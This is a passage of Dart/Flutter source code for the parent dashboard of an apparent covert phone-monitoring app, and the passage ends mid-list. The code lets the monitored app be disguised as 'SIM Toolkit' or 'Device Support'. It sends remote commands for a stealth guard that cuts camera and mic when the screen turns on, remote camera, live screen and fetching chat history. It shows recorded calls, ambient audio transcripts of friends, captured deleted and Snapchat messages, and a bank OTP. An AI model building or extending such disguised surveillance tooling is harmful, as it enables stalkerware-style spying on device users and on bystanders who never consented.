import 'dart:async';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/foundation.dart';
import '../models/device_status.dart';
import '../models/child_profile.dart';
import '../models/call_record.dart';
import '../models/chat_message.dart';
import '../models/notification_item.dart';
import '../models/watchlist_target.dart';
import '../models/ambient_log_item.dart';

class ParentDashboardProvider extends ChangeNotifier {
  ParentDashboardProvider() {
    _initFirebaseListeners();
  }

  FirebaseFirestore? _firestore;
  StreamSubscription? _deviceSub;
  StreamSubscription? _callsSub;
  StreamSubscription? _chatsSub;
  StreamSubscription? _notifsSub;

  final List<ChildProfile> _children = [
    const ChildProfile(
      id: "child_1",
      pairingCode: "VYRA-8921",
      name: "Aryan",
      deviceModel: "Vivo T3 Pro 5G",
      batteryLevel: 84,
      isOnline: true,
      locationAddress: "Near City Coaching Center, Sector 4",
      selectedDisguise: "SIM Toolkit",
    ),
    const ChildProfile(
      id: "child_2",
      pairingCode: "VYRA-4310",
      name: "Ananya",
      deviceModel: "Samsung Galaxy M34",
      batteryLevel: 62,
      isOnline: true,
      locationAddress: "Home, Model Town",
      selectedDisguise: "Device Support",
    ),
  ];
  List<ChildProfile> get children => _children;

  String _activeChildId = "child_1";
  String get activeChildId => _activeChildId;

  String get activePairingCode => activeChild.pairingCode;

  ChildProfile get activeChild =>
      _children.firstWhere((c) => c.id == _activeChildId, orElse: () => _children.first);

  void switchChild(String childId) {
    _activeChildId = childId;
    _initFirebaseListeners();
    notifyListeners();
  }

  ChildProfile addNewChild({
    required String name,
    String? deviceModel,
    String? customCode,
  }) {
    final code = (customCode != null && customCode.trim().isNotEmpty)
        ? customCode.trim().toUpperCase()
        : _generateUniquePairingCode();
    final newId = "child_${DateTime.now().millisecondsSinceEpoch}";
    final newChild = ChildProfile(
      id: newId,
      pairingCode: code,
      name: name.trim(),
      deviceModel: (deviceModel != null && deviceModel.trim().isNotEmpty)
          ? deviceModel.trim()
          : "Android Phone",
      batteryLevel: 100,
      isOnline: true,
      locationAddress: "Waiting for device setup...",
      selectedDisguise: "SIM Toolkit",
    );
    _children.add(newChild);
    _childCallRecords[newId] = [];
    _childChatMessages[newId] = [];
    _childAmbientLogs[newId] = [];
    _childNotifications[newId] = [];
    _childWatchlists[newId] = [];
    _activeChildId = newId;
    _initFirebaseListeners();
    notifyListeners();
    return newChild;
  }

  String _generateUniquePairingCode() {
    final rand = 1000 + (DateTime.now().millisecondsSinceEpoch % 9000);
    return 'VYRA-$rand';
  }

  ChildProfile linkChildWithCode(String code, {String? name}) {
    final cleanCode = code.trim().toUpperCase();
    if (cleanCode.isEmpty) return activeChild;

    final existingIdx = _children.indexWhere((c) => c.id == cleanCode || c.pairingCode == cleanCode);
    if (existingIdx != -1) {
      _activeChildId = _children[existingIdx].id;
      _initFirebaseListeners();
      notifyListeners();
      return _children[existingIdx];
    } else {
      final newChild = ChildProfile(
        id: cleanCode,
        pairingCode: cleanCode,
        name: name ?? "Child Device ($cleanCode)",
        deviceModel: "Android Phone",
        batteryLevel: 100,
        isOnline: true,
        locationAddress: "Connected via $cleanCode",
        selectedDisguise: "SIM Toolkit",
      );
      _children.add(newChild);
      _childCallRecords[cleanCode] = [];
      _childChatMessages[cleanCode] = [];
      _childAmbientLogs[cleanCode] = [];
      _childNotifications[cleanCode] = [];
      _childWatchlists[cleanCode] = [];
      _activeChildId = cleanCode;
      _initFirebaseListeners();
      notifyListeners();
      return newChild;
    }
  }

  void _initFirebaseListeners() {
    try {
      _firestore ??= FirebaseFirestore.instance;
      _deviceSub?.cancel();
      _callsSub?.cancel();
      _chatsSub?.cancel();
      _notifsSub?.cancel();

      final targetDocId = activePairingCode.isNotEmpty ? activePairingCode : _activeChildId;

      // 1. Listen to active child device telemetry
      _deviceSub = _firestore
          ?.collection('devices')
          .doc(targetDocId)
          .snapshots()
          .listen((snapshot) {
        if (snapshot.exists && snapshot.data() != null) {
          final data = snapshot.data()!;
          final idx = _children.indexWhere((c) => c.id == _activeChildId);
          if (idx != -1) {
            _children[idx] = ChildProfile(
              id: _activeChildId,
              name: data['name'] ?? _children[idx].name,
              deviceModel: data['deviceModel'] ?? _children[idx].deviceModel,
              batteryLevel: (data['batteryLevel'] as num?)?.toInt() ?? _children[idx].batteryLevel,
              isOnline: data['isOnline'] as bool? ?? _children[idx].isOnline,
              locationAddress: data['locationAddress'] ?? _children[idx].locationAddress,
              selectedDisguise: data['selectedDisguise'] ?? _children[idx].selectedDisguise,
            );
            notifyListeners();
          }
        }
      }, onError: (e) => debugPrint("Device stream info: $e"));

      // 2. Listen to call records
      _callsSub = _firestore
          ?.collection('calls')
          .doc(targetDocId)
          .collection('records')
          .orderBy('timestamp', descending: true)
          .snapshots()
          .listen((snapshot) {
        if (snapshot.docs.isNotEmpty) {
          final realRecords = snapshot.docs.map((doc) {
            final d = doc.data();
            final dt = _parseTimestamp(d['timestamp']);
            return CallRecord(
              id: doc.id,
              contactName: d['contactName'] ?? 'Unknown',
              phoneNumber: d['phoneNumber'] ?? '',
              callType: (d['callType'] == 'outgoing') ? CallType.outgoing : CallType.incoming,
              timestamp: dt,
              durationSeconds: (d['durationSeconds'] as num?)?.toInt() ?? 0,
              recordingUrl: d['recordingUrl'],
              recordingDurationSeconds: (d['durationSeconds'] as num?)?.toInt() ?? 0,
              isTamperAttemptDetected: d['isTamperAttemptDetected'] as bool? ?? false,
              isWatchlistTarget: d['isWatchlistTarget'] as bool? ?? false,
            );
          }).toList();

          _childCallRecords.putIfAbsent(_activeChildId, () => []);
          _childCallRecords[_activeChildId]!.clear();
          _childCallRecords[_activeChildId]!.addAll(realRecords);
          notifyListeners();
        }
      }, onError: (e) => debugPrint("Calls stream info: $e"));

      // 3. Listen to chats
      _chatsSub = _firestore
          ?.collection('chats')
          .doc(targetDocId)
          .collection('messages')
          .orderBy('timestamp', descending: true)
          .snapshots()
          .listen((snapshot) {
        if (snapshot.docs.isNotEmpty) {
          final realMsgs = snapshot.docs.map((doc) {
            final d = doc.data();
            final dt = _parseTimestamp(d['timestamp']);
            AppType app = AppType.whatsApp;
            final appStr = (d['app'] ?? '').toString().toLowerCase();
            if (appStr.contains('insta')) app = AppType.instagram;
            if (appStr.contains('tele')) app = AppType.telegram;
            if (appStr.contains('snap')) app = AppType.snapchat;
            if (appStr.contains('sms')) app = AppType.sms;

            final isIncoming = (d['isIncoming'] as bool?) ??
                (d['direction'] != 'OUTGOING' && d['isUser'] != true);

            return ChatMessage(
              id: doc.id,
              appType: app,
              contactName: d['sender'] ?? 'Unknown',
              contactIdentifier: d['sender'] ?? '',
              messageText: d['text'] ?? '',
              timestamp: dt,
              isIncoming: isIncoming,
              isDeletedBackup: d['isDeletedBySender'] as bool? ?? false,
              isWatchlistTarget: d['isWatchlistTarget'] as bool? ?? false,
            );
          }).toList();

          _childChatMessages.putIfAbsent(_activeChildId, () => []);
          _childChatMessages[_activeChildId]!.clear();
          _childChatMessages[_activeChildId]!.addAll(realMsgs);
          notifyListeners();
        }
      }, onError: (e) => debugPrint("Chats stream info: $e"));
    } catch (e) {
      debugPrint("Firestore listener offline/fallback: $e");
    }
  }

  String get _activeTargetDocId => activePairingCode.isNotEmpty ? activePairingCode : _activeChildId;

  DateTime _parseTimestamp(dynamic raw) {
    if (raw is Timestamp) return raw.toDate();
    if (raw is num) return DateTime.fromMillisecondsSinceEpoch(raw.toInt());
    if (raw is String) return DateTime.tryParse(raw) ?? DateTime.now();
    return DateTime.now();
  }

  void sendVoiceIntercom(String announcement) {
    debugPrint("Broadcasting voice intercom to ${activeChild.name}: $announcement");
    try {
      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
        'action': 'LOUDSPEAKER_INTERCOM',
        'payload': {'announcement': announcement},
        'status': 'PENDING',
        'timestamp': FieldValue.serverTimestamp(),
      });

    } catch (e) {
      debugPrint("Could not dispatch voice intercom to cloud: $e");
    }
  }

  DeviceStatus get deviceStatus {
    final c = activeChild;
    return DeviceStatus(
      deviceName: "${c.name}'s Phone",
      model: c.deviceModel,
      batteryLevel: c.batteryLevel,
      isCharging: false,
      isOnline: c.isOnline,
      lastSeen: DateTime.now(),
      locationAddress: c.locationAddress,
      latitude: 28.6139,
      longitude: 77.2090,
    );
  }

  bool _isPhoneLocked = false;
  bool get isPhoneLocked => _isPhoneLocked;

  bool _isLiveScreenActive = false;
  bool get isLiveScreenActive => _isLiveScreenActive;

  bool _isRemoteCameraActive = false;
  bool get isRemoteCameraActive => _isRemoteCameraActive;

  bool _isFlashlightOn = false;
  bool get isFlashlightOn => _isFlashlightOn;

  bool _isStealthScreenGuardEnabled = true; // Auto-cut camera/mic when child turns on screen
  bool get isStealthScreenGuardEnabled => _isStealthScreenGuardEnabled;

  void toggleStealthScreenGuard() {
    _isStealthScreenGuardEnabled = !_isStealthScreenGuardEnabled;
    try {
      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
        'action': 'SET_STEALTH_GUARD',
        'payload': {'enabled': _isStealthScreenGuardEnabled},
        'status': 'PENDING',
        'timestamp': FieldValue.serverTimestamp(),
      });
    } catch (e) {
      debugPrint("Could not dispatch stealth guard command: $e");
    }
    notifyListeners();
  }

  bool _isGeofenceEnabled = false; // Default OFF so child is never locked or restricted unexpectedly
  bool get isGeofenceEnabled => _isGeofenceEnabled;

  void toggleGeofence() {
    _isGeofenceEnabled = !_isGeofenceEnabled;
    try {
      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
        'action': 'SET_GEOFENCE_ACTIVE',
        'payload': {'enabled': _isGeofenceEnabled},
        'status': 'PENDING',
        'timestamp': FieldValue.serverTimestamp(),
      });
    } catch (e) {
      debugPrint("Could not dispatch geofence command: $e");
    }
    notifyListeners();
  }

  void switchDisguise(String disguiseName) {
    final idx = _children.indexWhere((c) => c.id == _activeChildId);
    if (idx != -1) {
      _children[idx] = _children[idx].copyWith(selectedDisguise: disguiseName);
      notifyListeners();
    }
    try {
      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
        'action': 'SWITCH_DISGUISE',
        'payload': {'disguise': disguiseName},
        'status': 'PENDING',
        'timestamp': FieldValue.serverTimestamp(),
      });
      debugPrint("Dispatched SWITCH_DISGUISE ($disguiseName) to child device");
    } catch (e) {
      debugPrint("Could not dispatch disguise change: $e");
    }
  }

  String _currentCameraLens = "back"; // "back" or "front"
  String get currentCameraLens => _currentCameraLens;

  String? _currentlyPlayingAudioId;
  String? get currentlyPlayingAudioId => _currentlyPlayingAudioId;

  // Selected App tab in Chats screen
  AppType _selectedChatApp = AppType.whatsApp;
  AppType get selectedChatApp => _selectedChatApp;

  // Call Records per Child
  final Map<String, List<CallRecord>> _childCallRecords = {
    'child_1': [
      CallRecord(
        id: "call_1",
        contactName: "Unknown (+91 98765 43210)",
        phoneNumber: "+919876543210",
        callType: CallType.incoming,
        timestamp: DateTime.now().subtract(const Duration(minutes: 25)),
        durationSeconds: 342, // 5 min 42 sec
        recordingUrl: "mock_recording_1.m4a",
        recordingDurationSeconds: 342,
        isTamperAttemptDetected: true, // Child attempted to stop recording!
        isWatchlistTarget: true,
      ),
      CallRecord(
        id: "call_2",
        contactName: "Rohan (School)",
        phoneNumber: "+919123456780",
        callType: CallType.outgoing,
        timestamp: DateTime.now().subtract(const Duration(hours: 3)),
        durationSeconds: 110,
        recordingUrl: "mock_recording_2.m4a",
        recordingDurationSeconds: 110,
        isTamperAttemptDetected: false,
      ),
      CallRecord(
        id: "call_3",
        contactName: "Coaching Center",
        phoneNumber: "+919988776655",
        callType: CallType.incoming,
        timestamp: DateTime.now().subtract(const Duration(hours: 7)),
        durationSeconds: 45,
        recordingUrl: "mock_recording_3.m4a",
        recordingDurationSeconds: 45,
        isTamperAttemptDetected: false,
      ),
    ],
    'child_2': [
      CallRecord(
        id: "call_a1",
        contactName: "Pooja (Dance Class)",
        phoneNumber: "+919823456789",
        callType: CallType.incoming,
        timestamp: DateTime.now().subtract(const Duration(minutes: 18)),
        durationSeconds: 210,
        recordingUrl: "mock_recording_a1.m4a",
        recordingDurationSeconds: 210,
        isTamperAttemptDetected: false,
        isWatchlistTarget: false,
      ),
      CallRecord(
        id: "call_a2",
        contactName: "Mom",
        phoneNumber: "+919911223344",
        callType: CallType.outgoing,
        timestamp: DateTime.now().subtract(const Duration(hours: 2)),
        durationSeconds: 65,
        recordingUrl: "mock_recording_a2.m4a",
        recordingDurationSeconds: 65,
        isTamperAttemptDetected: false,
      ),
      CallRecord(
        id: "call_a3",
        contactName: "Art Teacher",
        phoneNumber: "+919711002244",
        callType: CallType.incoming,
        timestamp: DateTime.now().subtract(const Duration(hours: 8)),
        durationSeconds: 140,
        recordingUrl: "mock_recording_a3.m4a",
        recordingDurationSeconds: 140,
        isTamperAttemptDetected: false,
      ),
    ],
  };
  List<CallRecord> get callRecords => _childCallRecords[_activeChildId] ?? [];

  // Ambient Soundbites & Voice Activity Logs per Child
  final Map<String, List<AmbientLogItem>> _childAmbientLogs = {
    'child_1': [
      AmbientLogItem(
        id: "ambient_1",
        timestamp: DateTime.now().subtract(const Duration(hours: 1, minutes: 20)),
        durationSeconds: 192,
        audioUrl: "mock_ambient_1.m4a",
        locationContext: "Near City Coaching Center, Sector 4",
        speechSnippet: "Discussion about practical files and planning to meet at metro gate.",
        isFlagged: true,
        detectedKeyword: "bunk",
        isPurgedFromCloud: true,
        storageFreedKb: 3840,
        conversationSummary: "Aryan and two coaching friends planning to assemble near Metro Gate 2 after class. Friend 1 warned not to bunk.",
        speakers: [
          SpeakerVoiceProfile(
            speakerId: "spk_1",
            displayName: "Aryan (Child)",
            isChild: true,
            pitch: "Medium-high pitch, adolescent voice",
            tone: "Casual & curious",
            acousticDescription: "Adolescent boy voice, clear pronunciation, typical familiar cadence.",
          ),
          SpeakerVoiceProfile(
            speakerId: "spk_2",
            displayName: "Speaker 2 (Friend 1)",
            isChild: false,
            pitch: "Deep baritone",
            tone: "Confident & fast-talking",
            acousticDescription: "Deeper masculine tone, fast tempo with North Indian / Delhi colloquial slang.",
          ),
          SpeakerVoiceProfile(
            speakerId: "spk_3",
            displayName: "Speaker 3 (Friend 2)",
            isChild: false,
            pitch: "Light, soft-spoken",
            tone: "Whispering & hesitant",
            acousticDescription: "Low muffled volume, cautious whisper, occasional background laughter.",
          ),
        ],
        dialogue: [
          DialogueTurn(
            speakerId: "spk_1",
            speakerName: "Aryan",
            timestamp: "00:04",
            hindiText: "Bhai kal coaching ke baad chalna hai kya udhar?",
            englishText: "Brother, do we have to go there after coaching tomorrow?",
            emotion: "Curious",
          ),
          DialogueTurn(
            speakerId: "spk_2",
            speakerName: "Speaker 2 (Deep Voice)",
            timestamp: "00:11",
            hindiText: "Haan sab arahe hain, 4 baje metro gate 2 pe milte hain. Bunk mat maariyo bas.",
            englishText: "Yes everyone is coming, let's meet at 4 PM at metro gate 2. Just don't bunk.",
            emotion: "Decisive",
          ),
          DialogueTurn(
            speakerId: "spk_3",
            speakerName: "Speaker 3 (Whispering)",
            timestamp: "00:18",
            hindiText: "Shhh dheere bol, koi sun na le. Practical file bhi le aana sath me.",
            englishText: "Shhh speak softly, lest someone hears. Bring the practical file along too.",
            emotion: "Cautious",
          ),
          DialogueTurn(
            speakerId: "spk_1",
            speakerName: "Aryan",
            timestamp: "00:26",
            hindiText: "Haan theek hai, mai time pe pahuch jaunga, file ready hai.",
            englishText: "Okay fine, I will reach on time, the file is ready.",
            emotion: "Agreeing",
          ),
        ],
      ),
      AmbientLogItem(
        id: "ambient_2",
        timestamp: DateTime.now().subtract(const Duration(hours: 3, minutes: 45)),
        durationSeconds: 285,
        audioUrl: "mock_ambient_2.m4a",
        locationContext: "Cafeteria / Market Area",
        speechSnippet: "Whispering conversation about a secret Instagram account.",
        isFlagged: true,
        detectedKeyword: "secret",
        isPurgedFromCloud: true,
        storageFreedKb: 4620,
        conversationSummary: "Quiet discussion about an alternate social media account and hiding it from parents.",
        speakers: [
          SpeakerVoiceProfile(
            speakerId: "spk_1",
            displayName: "Aryan (Child)",
            isChild: true,
            pitch: "Medium-high pitch",
            tone: "Whispering",
            acousticDescription: "Subdued tone, checking surroundings while speaking.",
          ),
          SpeakerVoiceProfile(
            speakerId: "spk_2",
            displayName: "Speaker 2 (Friend 1)",
            isChild: false,
            pitch: "Deep voice",
            tone: "Insistent",
            acousticDescription: "Fast-paced whisper with muffled laughter.",
          ),
        ],
        dialogue: [
          DialogueTurn(
            speakerId: "spk_2",
            speakerName: "Speaker 2 (Deep Voice)",
            timestamp: "00:08",
            hindiText: "Tu us secret ID se message kar, kisi ko pata nahi chalega.",
            englishText: "You message from that secret ID, no one will find out.",
            emotion: "Conspiratorial",
          ),
          DialogueTurn(
            speakerId: "spk_1",
            speakerName: "Aryan",
            timestamp: "00:19",
            hindiText: "Nahi bhai, phone me pakde gaye to dikkat ho jaegi.",
            englishText: "No brother, if caught on the phone it will be troublesome.",
            emotion: "Hesitant",
          ),
        ],
      ),
      AmbientLogItem(
        id: "ambient_3",
        timestamp: DateTime.now().subtract(const Duration(hours: 6)),
        durationSeconds: 150,
        audioUrl: "mock_ambient_3.m4a",
        locationContext: "Coaching Gate 2",
        speechSnippet: "Group laughter and discussion on homework notes and exam dates.",
        isFlagged: false,
        isPurgedFromCloud: true,
        storageFreedKb: 2980,
        conversationSummary: "Casual banter between classmates discussing teacher test schedules.",
        speakers: [
          SpeakerVoiceProfile(
            speakerId: "spk_1",
            displayName: "Aryan (Child)",
            isChild: true,
            pitch: "Normal clear pitch",
            tone: "Cheerful",
            acousticDescription: "Lively adolescent tone with natural laughter.",
          ),
          SpeakerVoiceProfile(
            speakerId: "spk_4",
            displayName: "Speaker 4 (Female Voice)",
            isChild: false,
            pitch: "Higher pitch, clear",
            tone: "Studious",
            acousticDescription: "Articulate female classmate voice discussing formula sheets.",
          ),
        ],
        dialogue: [
          DialogueTurn(
            speakerId: "spk_4",
            speakerName: "Speaker 4 (Classmate)",
            timestamp: "00:05",
            hindiText: "Physics ke numerical solve hue tumhare?",
            englishText: "Did you solve the Physics numericals?",
            emotion: "Normal",
          ),
          DialogueTurn(
            speakerId: "spk_1",
            speakerName: "Aryan",
            timestamp: "00:12",
            hindiText: "Haan bas 2 bache hain, kal subah submit kar dunga.",
            englishText: "Yes only 2 remaining, will submit tomorrow morning.",
            emotion: "Relaxed",
          ),
        ],
      ),
    ],
    'child_2': [
      AmbientLogItem(
        id: "ambient_a1",
        timestamp: DateTime.now().subtract(const Duration(minutes: 40)),
        durationSeconds: 160,
        audioUrl: "mock_ambient_a1.m4a",
        locationContext: "Home, Model Town",
        speechSnippet: "Discussion regarding dance competition costume and schedule.",
        isFlagged: false,
        isPurgedFromCloud: true,
        storageFreedKb: 3120,
        conversationSummary: "Ananya and friend discussing dance practice timing for upcoming school cultural fest.",
        speakers: [
          SpeakerVoiceProfile(
            speakerId: "spk_a1",
            displayName: "Ananya (Child)",
            isChild: true,
            pitch: "High, clear",
            tone: "Enthusiastic",
            acousticDescription: "Lively young girl voice, polite tone.",
          ),
          SpeakerVoiceProfile(
            speakerId: "spk_a2",
            displayName: "Pooja (Friend)",
            isChild: true,
            pitch: "Medium-high",
            tone: "Friendly",
            acousticDescription: "Warm conversational voice.",
          ),
        ],
        dialogue: [
          DialogueTurn(
            speakerId: "spk_a2",
            speakerName: "Pooja",
            timestamp: "00:04",
            hindiText: "Kal practice session 10 baje shuru hoga.",
            englishText: "Tomorrow practice session will start at 10 AM.",
            emotion: "Friendly",
          ),
          DialogueTurn(
            speakerId: "spk_a1",
            speakerName: "Ananya",
            timestamp: "00:10",
            hindiText: "Haan theek hai, mai costume sath le aaungi.",
            englishText: "Yes okay, I will bring the costume along.",
            emotion: "Enthusiastic",
          ),
        ],
      ),
    ],
  };
  List<AmbientLogItem> get ambientLogs => _childAmbientLogs[_activeChildId] ?? [];

  bool _autoPurgeCloudStorage = true;
  bool get autoPurgeCloudStorage => _autoPurgeCloudStorage;

  void toggleAutoPurgeCloudStorage() {
    _autoPurgeCloudStorage = !_autoPurgeCloudStorage;
    notifyListeners();
  }

  void purgeCloudAudio(String logId) {
    final list = _childAmbientLogs[_activeChildId];
    if (list != null) {
      final idx = list.indexWhere((l) => l.id == logId);
      if (idx != -1) {
        list[idx] = list[idx].copyWith(
          isPurgedFromCloud: true,
        );
        notifyListeners();
      }
    }
  }

  double get totalCloudPurgedMb {
    final list = _childAmbientLogs[_activeChildId] ?? [];
    final totalKb = list
        .where((l) => l.isPurgedFromCloud)
        .fold<int>(0, (total, item) => total + item.storageFreedKb);
    return totalKb / 1024.0;
  }

  // Chat Messages Date Range Filter (Default: Last 2 Days)
  ChatDateRange _selectedChatRange = ChatDateRange.last2Days;
  ChatDateRange get selectedChatRange => _selectedChatRange;

  void setSelectedChatRange(ChatDateRange range) {
    _selectedChatRange = range;
    notifyListeners();
  }

  Future<void> fetchHistoricalChatsFromDevice(int daysBack) async {
    try {
      _firestore?.collection('devices').doc(_activeTargetDocId).collection('commands').add({
        'action': 'FETCH_HISTORICAL_CHATS',
        'payload': {'daysBack': daysBack},
        'status': 'PENDING',
        'timestamp': FieldValue.serverTimestamp(),
      });
      debugPrint("Dispatched FETCH_HISTORICAL_CHATS ($daysBack days) to child device");
    } catch (e) {
      debugPrint("Error sending historical chat fetch command: $e");
    }
  }

  // Master Archive of Chat Messages per Child (Recent + Historical)
  final Map<String, List<ChatMessage>> _childChatMessages = {
    'child_1': [
      // --- WHATSAPP CONVERSATIONS ---
      // Thread 1: Unknown Contact (Suspicious / Watchlist)
      ChatMessage(
        id: "msg_w1",
        appType: AppType.whatsApp,
        contactName: "Unknown (+91 98765 43210)",
        contactIdentifier: "+919876543210",
        messageText: "Bhai kal jo baat hui thi kisi ko mat batana.",
        timestamp: DateTime.now().subtract(const Duration(minutes: 15)),
        isIncoming: true,
        isDeletedBackup: true,
        isWatchlistTarget: true,
      ),
      ChatMessage(
        id: "msg_w2",
        appType: AppType.whatsApp,
        contactName: "Unknown (+91 98765 43210)",
        contactIdentifier: "+919876543210",
        messageText: "Haan theek hai, delete kar diya na tune?",
        timestamp: DateTime.now().subtract(const Duration(minutes: 14)),
        isIncoming: false,
        isWatchlistTarget: true,
      ),
      ChatMessage(
        id: "msg_w2_extra",
        appType: AppType.whatsApp,
        contactName: "Unknown (+91 98765 43210)",
        contactIdentifier: "+919876543210",
        messageText: "Haan sab clear hai. Shaam ko park ke peeche milte hain.",
        timestamp: DateTime.now().subtract(const Duration(minutes: 11)),
        isIncoming: true,
        isDeletedBackup: true,
        isWatchlistTarget: true,
      ),
      // Thread 2: Rohan (School)
      ChatMessage(
        id: "msg_w3",
        appType: AppType.whatsApp,
        contactName: "Rohan (School)",
        contactIdentifier: "+919123456780",
        messageText: "Chemistry practical ki file kab submit karni hai?",
        timestamp: DateTime.now().subtract(const Duration(hours: 2)),
        isIncoming: true,
      ),
      ChatMessage(
        id: "msg_w4",
        appType: AppType.whatsApp,
        contactName: "Rohan (School)",
        contactIdentifier: "+919123456780",
        messageText: "Monday morning bol rahe the teacher. Saari diagrams bana li?",
        timestamp: DateTime.now().subtract(const Duration(hours: 1, minutes: 52)),
        isIncoming: false,
      ),
      ChatMessage(
        id: "msg_w5",
        appType: AppType.whatsApp,
        contactName: "Rohan (School)",
        contactIdentifier: "+919123456780",
        messageText: "Haan diagrams done hain. Sath me chalenge morning me.",
        timestamp: DateTime.now().subtract(const Duration(hours: 1, minutes: 48)),
        isIncoming: true,
      ),
      // Thread 3: Chacha Ji
      ChatMessage(
        id: "msg_w_chacha",
        appType: AppType.whatsApp,
        contactName: "Chacha Ji",
        contactIdentifier: "+919811122334",
        messageText: "Aryan beta, Papa ko bolna shaam ko call karein zaroori kaam hai.",
        timestamp: DateTime.now().subtract(const Duration(minutes: 50)),
        isIncoming: true,
      ),
      ChatMessage(
        id: "msg_w_chacha_reply",
        appType: AppType.whatsApp,
        contactName: "Chacha Ji",
        contactIdentifier: "+919811122334",
        messageText: "Ji Chacha Ji, Papa aate hi bol dunga.",
        timestamp: DateTime.now().subtract(const Duration(minutes: 42)),
        isIncoming: false,
      ),

      // --- INSTAGRAM DIRECT MESSAGES ---
      // Thread 1: Priya Sharma
      ChatMessage(
        id: "msg_i1",
        appType: AppType.instagram,
        contactName: "Priya Sharma",
        contactIdentifier: "@priya_sharma04",
        messageText: "Did you finish the assignment yet?",
        timestamp: DateTime.now().subtract(const Duration(hours: 1)),
        isIncoming: true,
      ),
      ChatMessage(
        id: "msg_i1_reply",
        appType: AppType.instagram,
        contactName: "Priya Sharma",
        contactIdentifier: "@priya_sharma04",
        messageText: "Almost done, sending notes in 10 minutes!",
        timestamp: DateTime.now().subtract(const Duration(minutes: 45)),
        isIncoming: false,
      ),
      // Thread 2: Rohan (Instagram)
      ChatMessage(
        id: "msg_i2",
        appType: AppType.instagram,
        contactName: "Rohan",
        contactIdentifier: "@rohan_speed",
        messageText: "Check out this reel haha",
        timestamp: DateTime.now().subtract(const Duration(hours: 4)),
        isIncoming: true,
      ),
      // Thread 3: Gaming Zone Club
      ChatMessage(
        id: "msg_i_old1",
        appType: AppType.instagram,
        contactName: "Gaming Zone Club",
        contactIdentifier: "@gaming_zone_delhi",
        messageText: "Weekend BGMI tournament registrations open. Entry fee Rs 200.",
        timestamp: DateTime.now().subtract(const Duration(days: 1)),
        isIncoming: true,
      ),

      // --- TELEGRAM CONVERSATIONS ---
      // Thread 1: Physics Study Group
      ChatMessage(
        id: "msg_t1",
        appType: AppType.telegram,
        contactName: "Physics Study Group",
        contactIdentifier: "@physics_12th",
        messageText: "Notes for Chapter 4 uploaded on Google Drive.",
        timestamp: DateTime.now().subtract(const Duration(hours: 5)),
        isIncoming: true,
      ),
      ChatMessage(
        id: "msg_t1_reply",
        appType: AppType.telegram,
        contactName: "Physics Study Group",
        contactIdentifier: "@physics_12th",
        messageText: "Sir numerical exercise questions kab submit karni hain?",
        timestamp: DateTime.now().subtract(const Duration(hours: 4, minutes: 45)),
        isIncoming: false,
      ),
      ChatMessage(
        id: "msg_t1_reply2",
        appType: AppType.telegram,
        contactName: "Physics Study Group",
        contactIdentifier: "@physics_12th",
        messageText: "Aman Sir: Friday evening class se pehle sabhi submit kar dena.",
        timestamp: DateTime.now().subtract(const Duration(hours: 4, minutes: 30)),
        isIncoming: true,
      ),
      // Thread 2: Rohit (Coaching Batchmate)
      ChatMessage(
        id: "msg_t2",
        appType: AppType.telegram,
        contactName: "Rohit (Coaching)",
        contactIdentifier: "@rohit_cbse",
        messageText: "Bhai kal test ke formula sheet share kar de na please.",
        timestamp: DateTime.now().subtract(const Duration(hours: 2, minutes: 15)),
        isIncoming: true,
      ),
      ChatMessage(
        id: "msg_t2_reply",
        appType: AppType.telegram,
        contactName: "Rohit (Coaching)",
        contactIdentifier: "@rohit_cbse",
        messageText: "Haan Telegram saved messages me check kar, bhej di.",
        timestamp: DateTime.now().subtract(const Duration(hours: 2)),
        isIncoming: false,
      ),
      // Thread 3: JEE Doubt Solver Bot
      ChatMessage(
        id: "msg_t3",
        appType: AppType.telegram,
        contactName: "JEE Doubt Bot",
        contactIdentifier: "@jee_doubt_solver",
        messageText: "Daily Practice Problem (DPP #18) for Mechanics is now available.",
        timestamp: DateTime.now().subtract(const Duration(hours: 7)),
        isIncoming: true,
      ),

      // --- SMS THREADS ---
      ChatMessage(
        id: "msg_s1",
        appType: AppType.sms,
        contactName: "SBI Banking",
        contactIdentifier: "VK-SBIINB",
        messageText: "OTP for your transaction is 492019. Valid for 10 mins. Do not share with anyone.",
        timestamp: DateTime.now().subtract(const Duration(minutes: 45)),
        isIncoming: true,
      ),
      ChatMessage(
        id: "msg_s_old1",
        appType: AppType.sms,
        contactName: "Jio Alert",
        contactIdentifier: "JM-JIO",
        messageText: "Daily high-speed data quota 100% consumed.",
        timestamp: DateTime.now().subtract(const Duration(days: 1)),
        isIncoming: true,
      ),

      // --- SNAPCHAT (Disappearing Snaps & Chats Captured) ---
      // Thread 1: Rohan (School)
      ChatMessage(
        id: "msg_snap1",
        appType: AppType.snapchat,
        contactName: "Rohan (School)",
        contactIdentifier: "@rohan_ghost",
        messageText: "Streaks check 🔥 Send snap back quickly.",
        timestamp: DateTime.now().subtract(const Duration(minutes: 35)),
        isIncoming: true,
        isDeletedBackup: true,
      ),
      ChatMessage(
        id: "msg_snap2",
        appType: AppType.snapchat,
        contactName: "Rohan (School)",
        contactIdentifier: "@rohan_ghost",
        messageText: "Sent a snap 📷 (Delivered)",
        timestamp: DateTime.now().subtract(const Duration(minutes: 34)),
        isIncoming: false,
      ),
      ChatMessage(
        id: "msg_snap3",
        appType: AppType.snapchat,
        contactName: "Rohan (School)",
        contactIdentifier: "@rohan_ghost",
        messageText: "Streak maintained 284 days 🔥",
        timestamp: DateTime.now().subtract(const Duration(minutes: 25)),
        isIncoming: true,
        isDeletedBackup: true,
      ),
      // Thread 2: Simran
      ChatMessage(
        id: "msg_snap_simran",
        appType: AppType.snapchat,
        contactName: "Simran K.",
        contactIdentifier: "@simran_k99",
        messageText: "Sent a photo snap 📸 [Captured before vanishing]",
        timestamp: DateTime.now().subtract(const Duration(hours: 3)),
        isIncoming: true,
        isDeletedBackup: true,
      ),

      // --- OLDER HISTORICAL ARCHIVED CHATS ---
      ChatMessage(
        id: "msg_w_old1",
        appType: AppType.whatsApp,
        contactName: "Unknown (+91 98765 43210)",
        contactIdentifier: "+919876543210",
        messageText: "Kal sham ko park ke peeche milte hain, kisi ko batana mat.",
        timestamp: DateTime.now().subtract(const Duration(days: 4)),
        isIncoming: true,
        isDeletedBackup: true,
        isWatchlistTarget: true,
      ),
      ChatMessage(
        id: "msg_w_old2",
        appType: AppType.whatsApp,
        contactName: "Rohan (School)",
        contactIdentifier: "+919123456780",
